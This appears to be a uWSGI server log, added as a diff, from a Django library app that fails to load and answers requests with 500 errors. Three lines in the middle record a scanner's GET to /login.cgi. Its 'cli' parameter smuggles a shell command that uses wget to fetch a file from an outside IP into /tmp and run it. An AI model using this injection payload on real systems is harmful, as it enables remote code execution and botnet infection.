@@ -1,0 +1,289 @@
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Aug 29 18:08:47 2018] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-28) on 29 August 2018 10:04:05
+os: Linux-3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017
+nodename: VM_0_5_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/SmartLibrary/uwsgi
+writing pidfile to /usr/SmartLibrary/uwsgi/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/SmartLibrary
+your processes number limit is 7283
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+!!! no /etc/mime.types file found !!!
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uWSGI http bound on 0.0.0.0:80 fd 3
+uwsgi socket 0 bound to UNIX address /usr/SmartLibrary/uwsgi/uwsgi.sock fd 6
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.6 (default, Aug 29 2018, 14:03:17)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]
+Python main interpreter initialized at 0x1d52780
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 486672 bytes (475 KB) for 5 cores
+*** Operational MODE: preforking ***
+ModuleNotFoundError: No module named 'test.wsgi'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 24933)
+spawned uWSGI worker 1 (pid: 24934, cores: 1)
+spawned uWSGI worker 2 (pid: 24935, cores: 1)
+spawned uWSGI worker 3 (pid: 24936, cores: 1)
+spawned uWSGI worker 4 (pid: 24937, cores: 1)
+spawned uWSGI worker 5 (pid: 24938, cores: 1)
+spawned uWSGI http 1 (pid: 24939)
+--- no python application found, check your startup logs for errors ---
+[pid: 24935|app: -1|req: -1/1] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:09:08 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 24937|app: -1|req: -1/2] 223.74.78.85 () {38 vars in 732 bytes} [Wed Aug 29 18:09:08 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 24936|app: -1|req: -1/3] 223.74.78.85 () {38 vars in 748 bytes} [Wed Aug 29 18:11:41 2018] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 24938|app: -1|req: -1/4] 223.74.78.85 () {38 vars in 726 bytes} [Wed Aug 29 18:11:41 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Aug 29 18:12:13 2018] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-28) on 29 August 2018 10:04:05
+os: Linux-3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017
+nodename: VM_0_5_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/SmartLibrary/uwsgi
+writing pidfile to /usr/SmartLibrary/uwsgi/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/SmartLibrary
+your processes number limit is 7283
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+!!! no /etc/mime.types file found !!!
+lock engine: pthread robust mutexes
+thunder lock: enabled
+probably another instance of uWSGI is running on the same address (0.0.0.0:80).
+bind(): Address already in use [core/socket.c line 769]
+--- no python application found, check your startup logs for errors ---
+[pid: 24934|app: -1|req: -1/5] 223.74.78.85 () {38 vars in 758 bytes} [Wed Aug 29 18:12:18 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 24935|app: -1|req: -1/6] 223.74.78.85 () {38 vars in 730 bytes} [Wed Aug 29 18:12:19 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 24939)
+...brutally killing workers...
+worker 1 buried after 0 seconds
+worker 2 buried after 0 seconds
+worker 3 buried after 0 seconds
+worker 4 buried after 0 seconds
+worker 5 buried after 0 seconds
+binary reloading uWSGI...
+chdir() to /usr/SmartLibrary/uwsgi
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 6 mapped to socket 0 (/usr/SmartLibrary/uwsgi/uwsgi.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from /usr/SmartLibrary/uwsgi/uwsgi.ini
+[uwsgi-static] added mapping for /static => /usr/SmartLibrary/static
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Aug 29 18:12:45 2018] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-28) on 29 August 2018 10:04:05
+os: Linux-3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017
+nodename: VM_0_5_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/SmartLibrary/uwsgi
+detected binary path: /usr/local/bin/uwsgi
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/SmartLibrary
+your processes number limit is 7283
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+!!! no /etc/mime.types file found !!!
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uWSGI http bound on 0.0.0.0:80 fd 3
+uwsgi socket 0 inherited UNIX address /usr/SmartLibrary/uwsgi/uwsgi.sock fd 6
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.6 (default, Aug 29 2018, 14:03:17)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]
+Python main interpreter initialized at 0x1605670
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 486672 bytes (475 KB) for 5 cores
+*** Operational MODE: preforking ***
+ModuleNotFoundError: No module named 'test.wsgi'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 24933)
+spawned uWSGI worker 1 (pid: 25226, cores: 1)
+spawned uWSGI worker 2 (pid: 25227, cores: 1)
+spawned uWSGI worker 3 (pid: 25228, cores: 1)
+spawned uWSGI worker 4 (pid: 25229, cores: 1)
+spawned uWSGI worker 5 (pid: 25230, cores: 1)
+spawned uWSGI http 1 (pid: 25231)
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Aug 29 18:14:52 2018] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-28) on 29 August 2018 10:04:05
+os: Linux-3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017
+nodename: VM_0_5_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root
+writing pidfile to /usr/SmartLibrary/uwsgi/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/SmartLibrary
+your processes number limit is 7283
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+!!! no /etc/mime.types file found !!!
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uWSGI http bound on 0.0.0.0:80 fd 3
+uwsgi socket 0 bound to UNIX address /usr/SmartLibrary/uwsgi/uwsgi.sock fd 6
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.6 (default, Aug 29 2018, 14:03:17)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]
+Python main interpreter initialized at 0x10d1720
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 486672 bytes (475 KB) for 5 cores
+*** Operational MODE: preforking ***
+ModuleNotFoundError: No module named 'test.wsgi'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1323)
+spawned uWSGI worker 1 (pid: 1324, cores: 1)
+spawned uWSGI worker 2 (pid: 1325, cores: 1)
+spawned uWSGI worker 3 (pid: 1326, cores: 1)
+spawned uWSGI worker 4 (pid: 1327, cores: 1)
+spawned uWSGI worker 5 (pid: 1328, cores: 1)
+spawned uWSGI http 1 (pid: 1329)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/1] 223.74.78.85 () {40 vars in 779 bytes} [Wed Aug 29 18:14:57 2018] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/2] 223.74.78.85 () {42 vars in 779 bytes} [Wed Aug 29 18:14:57 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/3] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:15:04 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/4] 223.74.78.85 () {38 vars in 732 bytes} [Wed Aug 29 18:15:04 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/5] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:56 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/6] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:56 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/7] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:57 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/8] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:57 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/9] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:57 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/10] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:57 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/11] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:57 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/12] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:57 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/13] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:57 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/14] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:58 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/15] 223.74.78.85 () {40 vars in 791 bytes} [Wed Aug 29 18:17:58 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/16] 223.74.78.85 () {42 vars in 785 bytes} [Wed Aug 29 18:17:58 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/17] 223.74.78.85 () {38 vars in 748 bytes} [Wed Aug 29 18:18:01 2018] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/18] 223.74.78.85 () {38 vars in 726 bytes} [Wed Aug 29 18:18:01 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/19] 223.74.78.85 () {40 vars in 779 bytes} [Wed Aug 29 18:18:15 2018] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/20] 223.74.78.85 () {38 vars in 726 bytes} [Wed Aug 29 18:18:15 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/21] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:20:28 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/22] 223.74.78.85 () {38 vars in 732 bytes} [Wed Aug 29 18:20:28 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/23] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:20:35 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/24] 223.74.78.85 () {38 vars in 732 bytes} [Wed Aug 29 18:20:35 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+Wed Aug 29 18:21:38 2018 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ngynx%20-O%20-%3E%20/tmp/ngynx;sh%20/tmp/ngynx%27$ (ip 1.54.187.84) !!!
+Wed Aug 29 18:21:38 2018 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ngynx%20-O%20-%3E%20/tmp/ngynx;sh%20/tmp/ngynx%27$ (1.54.187.84)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/25] 1.54.187.84 () {30 vars in 535 bytes} [Wed Aug 29 18:21:38 2018] GET /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ngynx%20-O%20-%3E%20/tmp/ngynx;sh%20/tmp/ngynx%27$ => generated 0 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 0 bytes (0 switches on core 0)
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Aug 29 18:22:11 2018] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-28) on 29 August 2018 10:04:05
+os: Linux-3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017
+nodename: VM_0_5_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /usr/SmartLibrary/uwsgi
+writing pidfile to /usr/SmartLibrary/uwsgi/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /usr/SmartLibrary
+your processes number limit is 7283
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+!!! no /etc/mime.types file found !!!
+lock engine: pthread robust mutexes
+thunder lock: enabled
+probably another instance of uWSGI is running on the same address (0.0.0.0:80).
+bind(): Address already in use [core/socket.c line 769]
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/26] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:52 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/27] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:52 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/28] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/29] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/30] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/31] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/32] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/33] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/34] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/35] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/36] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/37] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/38] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:53 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/39] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:53 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/40] 223.74.78.85 () {40 vars in 790 bytes} [Wed Aug 29 18:22:54 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/41] 223.74.78.85 () {42 vars in 784 bytes} [Wed Aug 29 18:22:54 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/42] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:22:58 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1325|app: -1|req: -1/43] 223.74.78.85 () {38 vars in 731 bytes} [Wed Aug 29 18:22:58 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1327|app: -1|req: -1/44] 223.74.78.85 () {38 vars in 748 bytes} [Wed Aug 29 18:23:07 2018] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1324|app: -1|req: -1/45] 223.74.78.85 () {38 vars in 726 bytes} [Wed Aug 29 18:23:07 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1326|app: -1|req: -1/46] 223.74.78.85 () {38 vars in 760 bytes} [Wed Aug 29 18:23:21 2018] GET /admin/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 1328|app: -1|req: -1/47] 223.74.78.85 () {38 vars in 732 bytes} [Wed Aug 29 18:23:21 2018] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
